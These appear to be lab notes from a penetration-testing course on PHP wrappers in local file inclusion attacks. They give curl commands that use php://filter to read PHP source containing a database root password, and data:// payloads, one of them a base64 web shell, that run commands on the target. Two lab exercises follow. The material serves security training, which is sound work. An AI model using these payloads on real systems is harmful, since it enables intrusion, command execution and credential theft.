# PHP Wrappers

Contents of the admin.php file
>``` shell
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
>
># ========== Expected Result ==========
>...
><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
><!DOCTYPE html>
><html lang="en">
><head>
>    <meta charset="UTF-8">
>    <meta name="viewport" content="width=device-width, initial-scale=1.0">
>    <title>Maintenance</title>
></head>
><body>
>        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
># =====================================
>```

Usage of "php://filter" to include unencoded admin.php
>``` shell
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
>
># ========== Expected Result ==========
>...
><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
><!DOCTYPE html>
><html lang="en">
><head>
>    <meta charset="UTF-8">
>    <meta name="viewport" content="width=device-width, initial-scale=1.0">
>    <title>Maintenance</title>
></head>
><body>
>        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
># =====================================
>```

Usage of "php://filter" to include base64 encoded admin.php
>``` shell
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
>
># ========== Expected Result ==========
>...
><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
>PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
>dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
>...
># =====================================
>```

Decoding the base64 encoded content of admin.php
>``` shell
>kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
>
># ========== Expected Result ==========
><!DOCTYPE html>
><html lang="en">
><head>
>    <meta charset="UTF-8">
>    <meta name="viewport" content="width=device-width, initial-scale=1.0">
>    <title>Maintenance</title>
></head>
><body>
>        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>
>
><?php
>$servername = "localhost";
>$username = "root";
>$password = "M00nK4keCard!2#";
>
>// Create connection
>$conn = new mysqli($servername, $username, $password);
>...
># =====================================
>```

Usage of the "data://" wrapper to execute ls
>``` shell
>kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
>
># ========== Expected Result ==========
>...
><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
>admin.php
>bavarian.php
>css
>fonts
>img
>index.php
>js
>...
># =====================================
>```

Usage of the "data://" wrapper with base64 encoded data
>``` shell
>kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
>
># ========== Expected Result ==========
>PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
># =====================================
>
>curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
>
># ========== Expected Result ==========
>...
><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
>admin.php
>bavarian.php
>css
>fonts
>img
>index.php
>js
>start.sh
>...
># =====================================
>```

Lab 1 - Exploit the Local File Inclusion vulnerability on WEB18 (VM #1) by using the php://filter with base64 encoding to include the contents of the /var/www/html/backup.php file with Burp or curl. Copy the output, decode it, and find the flag.
>``` shell
>
>```
>

Lab 2 - Follow the steps above and use the data:// PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to execute the uname -a command on WEB18 (VM #1). Enter the Linux kernel version as answer.
>``` shell
>
>```
>
